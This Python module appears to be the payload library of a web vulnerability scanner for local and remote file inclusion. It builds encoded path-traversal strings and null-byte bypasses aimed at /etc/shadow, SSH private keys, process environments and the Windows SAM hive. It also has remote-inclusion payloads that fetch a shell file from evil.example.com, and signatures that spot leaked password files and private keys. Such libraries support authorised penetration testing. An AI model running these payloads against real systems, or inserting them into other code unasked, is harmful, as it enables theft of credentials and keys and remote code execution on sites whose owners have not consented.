"""
LFI / RFI payload library.
"""

from __future__ import annotations


# ── Path traversal sequences ──────────────────────────────────────────────────

TRAVERSAL_SEQUENCES: list[str] = [
    "../",
    "..\\",
    ".../.../",
    "....//",
    "..//" * 2,
    "..%2F",
    "..%5C",
    "%2e%2e%2f",
    "%2e%2e/",
    "..%2f",
    "%2e%2e%5c",
    "..%252f",           # Double URL encode
    "%252e%252e%252f",
    "..%c0%af",          # Over-long UTF-8
    "..%c1%9c",
    "..%ef%bc%8f",       # Full-width slash
]

# ── Linux / Unix sensitive file targets ──────────────────────────────────────

UNIX_FILES: list[str] = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/issue",
    "/etc/motd",
    "/proc/self/environ",
    "/proc/version",
    "/proc/cmdline",
    "/proc/self/fd/0",
    "/var/log/apache2/access.log",
    "/var/log/apache/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/var/log/syslog",
    "/usr/local/apache/logs/access_log",
    "/usr/local/apache2/logs/access_log",
    "~/.bash_history",
    "~/.ssh/id_rsa",
    "~/.ssh/known_hosts",
]

# ── Windows sensitive file targets ────────────────────────────────────────────

WINDOWS_FILES: list[str] = [
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\boot.ini",
    "C:\\Windows\\System32\\config\\SAM",
    "C:\\inetpub\\wwwroot\\web.config",
    "C:\\xampp\\apache\\conf\\httpd.conf",
    "C:/Windows/win.ini",
    "C:/boot.ini",
    "C:/Windows/System32/drivers/etc/hosts",
    "\\Windows\\win.ini",
    "\\boot.ini",
]


# ── Null byte bypass ──────────────────────────────────────────────────────────

def with_null_byte(path: str) -> list[str]:
    return [path, path + "%00", path + "\x00", path + "%00.php"]


# ── Build full LFI payload list ───────────────────────────────────────────────

def get_lfi_payloads(os: str = "linux") -> list[str]:
    """
    Generate LFI traversal payloads.
    os: 'linux' | 'windows' | 'both'
    """
    targets = []
    if os in ("linux", "both"):
        targets += UNIX_FILES
    if os in ("windows", "both"):
        targets += WINDOWS_FILES

    payloads = []
    for depth in [2, 3, 4, 5, 6]:
        traversal = "../" * depth
        for t in targets:
            clean_t = t.lstrip("/").lstrip("C:").lstrip("\\")
            payloads.append(traversal + clean_t)
            # null byte
            payloads.append(traversal + clean_t + "%00")

    # Add direct paths too (misconfigured includes)
    payloads += targets

    # Add traversal bypasses
    for seq in TRAVERSAL_SEQUENCES:
        for t in targets[:5]:   # limit to top 5 to avoid explosion
            payloads.append(seq * 3 + t.lstrip("/"))

    return list(dict.fromkeys(payloads))   # deduplicate, preserve order


# ── RFI payloads ──────────────────────────────────────────────────────────────

RFI_PAYLOADS: list[str] = [
    "http://evil.example.com/shell.txt",
    "https://evil.example.com/shell.txt",
    "http://evil.example.com/shell.txt?",
    "http://evil.example.com/shell.txt%00",
    "//evil.example.com/shell.txt",
    "\\\\evil.example.com\\shell.txt",
]

# ── Detection signatures ──────────────────────────────────────────────────────

LFI_SIGNATURES: list[str] = [
    # Linux /etc/passwd
    "root:x:0:0:",
    "root:!:0:0:",
    "daemon:x:",
    "/bin/bash",
    "/bin/sh",
    # Windows
    "[boot loader]",
    "[operating systems]",
    "[fonts]",
    "extension=",
    # Apache config
    "ServerRoot",
    "DocumentRoot",
    # PHP config
    "php_flag",
    "php_value",
    # Nginx config
    "worker_processes",
    # Generic sensitive content
    "SSH PRIVATE KEY",
    "BEGIN RSA PRIVATE KEY",
]
